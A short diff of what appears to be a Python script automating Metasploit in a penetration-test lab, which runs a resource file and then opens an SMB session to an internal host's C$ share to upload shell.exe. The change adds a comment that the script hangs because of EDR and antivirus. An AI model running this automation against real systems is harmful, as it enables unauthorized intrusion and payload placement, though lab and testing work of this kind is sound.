@@ -18,7 +18,7 @@ print ("RUNNING RESOURCE 1")
 metasploit_process.sendline('resource resource1.rc')
 metasploit_process.expect('auxiliary')
 print ("RESOURCE 1 COMPLETED - SUCCESS")
-
+#Hangs here due to EDR and AV
 #SMB client put shell.exe
 metasploit_process.sendline('!smbclient //172.22.117.20/C$ -I megacorpone/tstark')
 metasploit_process.expect('smb:')
